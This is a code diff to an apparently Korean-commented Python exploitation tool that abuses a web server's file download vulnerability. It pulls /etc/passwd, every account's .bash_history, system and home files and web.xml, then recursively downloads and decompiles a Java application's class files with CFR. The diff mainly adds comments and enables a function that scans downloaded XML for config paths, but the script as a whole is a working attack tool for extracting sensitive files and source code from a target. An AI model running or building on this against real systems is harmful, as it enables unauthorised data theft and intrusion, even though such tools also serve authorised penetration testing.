@@ -14,10 +14,12 @@ from dictionary import (
     file_extensions,
 )
 
+# 추출 파일 디렉터리 지정 ./extract
 BASE_DIR = Path.cwd() / "extract"
 BASE_DIR.mkdir(parents=True, exist_ok=True)
 
-downloaded_file = []
+
+first_downloaded_file = []
 homeDir = "" # ex) /home/test
 downloaded_class_list = []
 WebRoot = [] # ex) /storage/webapps/test/site
@@ -25,13 +27,14 @@ WebRoot = [] # ex) /storage/webapps/test/site
 # 다운로드 실패 시 0바이트가 아닌 문구 등 바이트 반환될때 고정 값 넣어주기
 download_Fail_byte = b""
 
-# class_file extract
+# class_file extract 
 IMPORT_PATTERN = re.compile(r"^import com")
 PACKAGE_PATTERN = re.compile(r"^package com")
 
 
 # --passwd 로직
 
+# passwd에서 모든 계정 .bash_history 다운 시도
 def extract_account(passwd: Path) -> None:
     global homeDir
     with open(passwd, "r") as f:
@@ -55,12 +58,15 @@ def extract_account(passwd: Path) -> None:
                         homeDir = home + "/"
                     mkFile(bash_history, bHistory)
 
+# 파일 다운로드 성공 시 파일 생성 함수
 def mkFile(fileContent: bytes, filePath: str):
     save_path = BASE_DIR / filePath.lstrip("/")
     save_path.parent.mkdir(parents=True, exist_ok=True)
     save_path.write_bytes(fileContent)
     print("File Extract : " + str(save_path))
 
+
+# 홈디렉터리 내 기본 파일 다운로드 함수
 def download_HomeFile():
     for file in home_directory_files:
         if homeDir == "/":
@@ -71,6 +77,7 @@ def download_HomeFile():
         if result and (not download_Fail_byte or download_Fail_byte not in result):
             mkFile(result, path)
 
+# 서버 내부 기본 시스템 파일 다운로드 함수
 def download_SystemFile():
     for file_list in system_file:
         for file in file_list:
@@ -79,9 +86,10 @@ def download_SystemFile():
             if result and (not download_Fail_byte or download_Fail_byte not in result):
                 mkFile(result, path)
 
+# passwd 기준 다운로드 요청 및 응답 반환함수
 def download_File(path: str) -> bytes:
     
-    if path in downloaded_file:
+    if path in first_downloaded_file:
         return b""
 
     # print(path)
@@ -99,7 +107,7 @@ def download_File(path: str) -> bytes:
             "Cookies": "JESSIONID"
         }
         response = requests.get(url=targetUrl_GET, params=params)
-        downloaded_file.append(path)
+        first_downloaded_file.append(path)
         time.sleep(0.5)
         if len(response.content) == 0:
             return b""
@@ -117,14 +125,14 @@ def download_File(path: str) -> bytes:
             "Cookies": "JESSIONID"
         }
         response.post(url=targetUrl_POST, data=data)
-        downloaded_file.append(path)
+        first_downloaded_file.append(path)
         time.sleep(0.5)
         if len(response.content) == 0:
             return b""
         else:
             return response.content
 
-
+# .bash_history에서 각 라인 WEB-INF 문자열 탐지
 def find_WebRoot(line: str):
     matches = re.findall(r'(/[\w/.-]+)', line)
     for file_path in matches:
@@ -137,6 +145,7 @@ def find_WebRoot(line: str):
                 WebRoot.append(web_root)
                 print("find WEBROOT : " + web_root)
 
+# webRoot 있으면 web.xml 전부 다운
 def download_web_xml():
     if WebRoot:
         for path in WebRoot:
@@ -145,11 +154,18 @@ def download_web_xml():
             if result and (not download_Fail_byte or download_Fail_byte not in result):
                 mkFile(result, path)
 
-# def extract_download_path():
-#     for file in downloaded_file:
+# 1차 파일 다운로드 수행 후 xml 파일 다 뒤져서 "classpath" 및 .xml 같은 내부 파일 탐지 및 2차 다운로드 시작 함수 
+def extract_download_path():
+    for file in first_downloaded_file:
+        if file.endswith('.xml'):
+            with open(file, "r") as f:
+                for line in f:
+                    match = re.search(r'(classpath|\.xml|properties|property|config)', line, re.IGNORECASE)
+                    if match:
+                        print("Detect File Keyword : " + line.strip())
 
-
-
+            
+# passwd 방식 경우 .bash_history 해석 및 다운로드 함수
 def solve_Bash_History():
     relativeHomeDir = homeDir.lstrip("/")
     with open(BASE_DIR / relativeHomeDir / ".bash_history", "r") as f:
@@ -214,6 +230,7 @@ def solve_Bash_History():
 
 # --class_file 로직
 
+# .class 파일 cfr 디컴파일 함수
 def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
     if not cfr_path.is_file():
         raise FileNotFoundError(f"CFR file not Found!!!")
@@ -230,6 +247,7 @@ def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
     make_directory(result.stdout, class_path)
     return extract_class(result.stdout)
 
+# .class 디컴파일 경로 생성
 def make_directory(decompiled_result: str, fileName: Path) -> None:
     for line in decompiled_result.splitlines():
         if PACKAGE_PATTERN.search(line):
@@ -241,11 +259,13 @@ def make_directory(decompiled_result: str, fileName: Path) -> None:
             # print(package_dir)
             save_decompile_class_file(decompiled_result, Path(package_dir), Path(fileName).stem)
 
+# .class 디컴파일 결과 저장
 def save_decompile_class_file(decompile_result: str, save_path: Path, file_name: str):
     output_path = os.path.join(save_path, file_name)+".java"
     with open(output_path, "w", encoding="utf-8") as f:
         f.write(decompile_result)
 
+# .class 파일 임포트 내 com 시작 클래스 추출
 def extract_class(decompile_class: str) -> list[str]:
     classPath_list = []
     for line in decompile_class.splitlines():
@@ -262,7 +282,7 @@ def extract_class(decompile_class: str) -> list[str]:
                 classPath_list.append(class_name)
     return classPath_list
 
-# if you want POST method "targetUrl_GET = ''"
+# 파일 다운로드 함수 if you want POST method "targetUrl_GET = ''"
 def download_java_classes(classPath_list: list[str]):
     targetUrl_GET = ""
     targetUrl_POST = ""
@@ -340,6 +360,7 @@ def download_java_classes(classPath_list: list[str]):
             time.sleep(1)
             download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
 
+# 메인
 def main():
     parser = argparse.ArgumentParser(
         description="Java Project Class or File extract via file download vulnerability"
@@ -359,7 +380,7 @@ def main():
             # extract_download_path()
         else:
             print("Not Found .bash_history...")
-            # 다른 프레임워크 추가 예정
+            
     else:
         print("[*] No passwd file provide...")
     
